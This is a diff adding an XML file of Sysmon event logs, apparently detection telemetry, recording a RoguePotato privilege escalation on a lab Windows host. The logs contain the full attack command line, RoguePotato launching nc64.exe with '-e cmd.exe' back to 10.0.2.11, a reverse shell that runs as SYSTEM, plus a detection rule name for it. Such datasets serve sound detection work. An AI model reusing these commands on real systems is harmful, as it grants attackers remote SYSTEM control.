@@ -1,0 +1,228 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2020-05-11T23:21:56.493742100Z" />
+      <EventRecordID>141988</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2896" ThreadID="3548" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2020-05-11 23:21:56.490</Data>
+      <Data Name="ProcessGuid">{747f3d96-de14-5eb9-0000-0010be064300}</Data>
+      <Data Name="ProcessId">4200</Data>
+      <Data Name="Image">C:\Users\IEUser\Tools\PrivEsc\RoguePotato.exe</Data>
+      <Data Name="FileVersion">?</Data>
+      <Data Name="Description">?</Data>
+      <Data Name="Product">?</Data>
+      <Data Name="Company">?</Data>
+      <Data Name="OriginalFileName">?</Data>
+      <Data Name="CommandLine">RoguePotato.exe  -r 10.0.2.11 -e "c:\Users\IEUser\tools\misc\nc64.exe 10.0.2.11 3001 -e cmd.exe" -l 9999</Data>
+      <Data Name="CurrentDirectory">c:\Users\IEUser\tools\PrivEsc\</Data>
+      <Data Name="User">NT AUTHORITY\LOCAL SERVICE</Data>
+      <Data Name="LogonGuid">{747f3d96-5461-5eba-0000-0020e5030000}</Data>
+      <Data Name="LogonId">0x3e5</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">SHA1=54058CC1FADAB57223F2D7004AD79333D63C628B,MD5=2DD755BE5842E71B304D2FBFF93EB2A3,SHA256=A4778D50307DE4AB13E48DE90D72B7C5E19B4F9356A611A9FAF95CFDA0523C46,IMPHASH=959A83047E80AB68B368FDB3F4C6E4EA</Data>
+      <Data Name="ParentProcessGuid">{747f3d96-d7ac-5eb9-0000-0010bdee2900}</Data>
+      <Data Name="ParentProcessId">6404</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"cmd.exe" </Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>17</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>17</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2020-05-11T23:21:56.519003600Z" />
+      <EventRecordID>141989</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2896" ThreadID="3548" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">Rogue Epmapper np detected - possible RoguePotato privesc</Data>
+      <Data Name="EventType">CreatePipe</Data>
+      <Data Name="UtcTime">2020-05-11 23:21:56.507</Data>
+      <Data Name="ProcessGuid">{747f3d96-de14-5eb9-0000-0010be064300}</Data>
+      <Data Name="ProcessId">4200</Data>
+      <Data Name="PipeName">\RoguePotato\pipe\epmapper</Data>
+      <Data Name="Image">c:\Users\IEUser\tools\PrivEsc\RoguePotato.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>18</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>18</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2020-05-11T23:21:56.562802100Z" />
+      <EventRecordID>141990</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2896" ThreadID="3548" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">Rogue Epmapper np detected - possible RoguePotato privesc</Data>
+      <Data Name="EventType">ConnectPipe</Data>
+      <Data Name="UtcTime">2020-05-11 23:21:56.554</Data>
+      <Data Name="ProcessGuid">{747f3d96-545a-5eba-0000-0010eb030000}</Data>
+      <Data Name="ProcessId">4</Data>
+      <Data Name="PipeName">\RoguePotato\pipe\epmapper</Data>
+      <Data Name="Image">System</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2020-05-11T23:21:56.587063600Z" />
+      <EventRecordID>141991</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2896" ThreadID="3548" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2020-05-11 23:21:56.584</Data>
+      <Data Name="ProcessGuid">{747f3d96-de14-5eb9-0000-00107c0f4300}</Data>
+      <Data Name="ProcessId">4468</Data>
+      <Data Name="Image">C:\Users\IEUser\Tools\Misc\nc64.exe</Data>
+      <Data Name="FileVersion">?</Data>
+      <Data Name="Description">?</Data>
+      <Data Name="Product">?</Data>
+      <Data Name="Company">?</Data>
+      <Data Name="OriginalFileName">?</Data>
+      <Data Name="CommandLine">c:\Users\IEUser\tools\misc\nc64.exe 10.0.2.11 3001 -e cmd.exe</Data>
+      <Data Name="CurrentDirectory">c:\Users\IEUser\tools\PrivEsc\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{747f3d96-5461-5eba-0000-0020e7030000}</Data>
+      <Data Name="LogonId">0x3e7</Data>
+      <Data Name="TerminalSessionId">0</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">SHA1=DAC7867EE642A65262E153147552BEFB0B45B036,MD5=470797A25A6B21D0A46F82968FD6A184,SHA256=CE80B839411B1541D09B0EDE82F1477B516DA0C60760079F46BA4443E1A6F419,IMPHASH=CDC279A12C6A556C25BA7B0510C2B96E</Data>
+      <Data Name="ParentProcessGuid">{747f3d96-de14-5eb9-0000-0010be064300}</Data>
+      <Data Name="ParentProcessId">4200</Data>
+      <Data Name="ParentImage">C:\Users\IEUser\Tools\PrivEsc\RoguePotato.exe</Data>
+      <Data Name="ParentCommandLine">RoguePotato.exe  -r 10.0.2.11 -e "c:\Users\IEUser\tools\misc\nc64.exe 10.0.2.11 3001 -e cmd.exe" -l 9999</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2020-05-11T23:21:56.661289200Z" />
+      <EventRecordID>141993</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2896" ThreadID="3548" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2020-05-11 23:21:56.654</Data>
+      <Data Name="ProcessGuid">{747f3d96-de14-5eb9-0000-001079154300}</Data>
+      <Data Name="ProcessId">224</Data>
+      <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="FileVersion">10.0.17763.592 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows Command Processor</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">Cmd.Exe</Data>
+      <Data Name="CommandLine">cmd.exe</Data>
+      <Data Name="CurrentDirectory">c:\Users\IEUser\tools\PrivEsc\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{747f3d96-5461-5eba-0000-0020e7030000}</Data>
+      <Data Name="LogonId">0x3e7</Data>
+      <Data Name="TerminalSessionId">0</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data>
+      <Data Name="ParentProcessGuid">{747f3d96-de14-5eb9-0000-00107c0f4300}</Data>
+      <Data Name="ParentProcessId">4468</Data>
+      <Data Name="ParentImage">C:\Users\IEUser\Tools\Misc\nc64.exe</Data>
+      <Data Name="ParentCommandLine">c:\Users\IEUser\tools\misc\nc64.exe 10.0.2.11 3001 -e cmd.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2020-05-11T23:22:26.650196900Z" />
+      <EventRecordID>142033</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="2896" ThreadID="3548" />
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>MSEDGEWIN10</Computer>
+      <Security UserID="S-1-5-18" />
+    </System>
+    <EventData>
+      <Data Name="RuleName">
+      </Data>
+      <Data Name="UtcTime">2020-05-11 23:22:26.451</Data>
+      <Data Name="ProcessGuid">{747f3d96-de32-5eb9-0000-00103fc14300}</Data>
+      <Data Name="ProcessId">5252</Data>
+      <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
+      <Data Name="FileVersion">10.0.17763.1 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Host Process for Windows Services</Data>
+      <Data Name="Product">Microsoft« Windows« Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">svchost.exe</Data>
+      <Data Name="CommandLine">C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc</Data>
+      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
+      <Data Name="User">NT AUTHORITY\SYSTEM</Data>
+      <Data Name="LogonGuid">{747f3d96-5461-5eba-0000-0020e7030000}</Data>
+      <Data Name="LogonId">0x3e7</Data>
+      <Data Name="TerminalSessionId">0</Data>
+      <Data Name="IntegrityLevel">System</Data>
+      <Data Name="Hashes">SHA1=A1385CE20AD79F55DF235EFFD9780C31442AA234,MD5=8A0A29438052FAED8A2532DA50455756,SHA256=7FD065BAC18C5278777AE44908101CDFED72D26FA741367F0AD4D02020787AB6,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69</Data>
+      <Data Name="ParentProcessGuid">{00000000-0000-0000-0000-000000000000}</Data>
+      <Data Name="ParentProcessId">580</Data>
+      <Data Name="ParentImage">?</Data>
+      <Data Name="ParentCommandLine">?</Data>
+    </EventData>
+  </Event>
+</root>
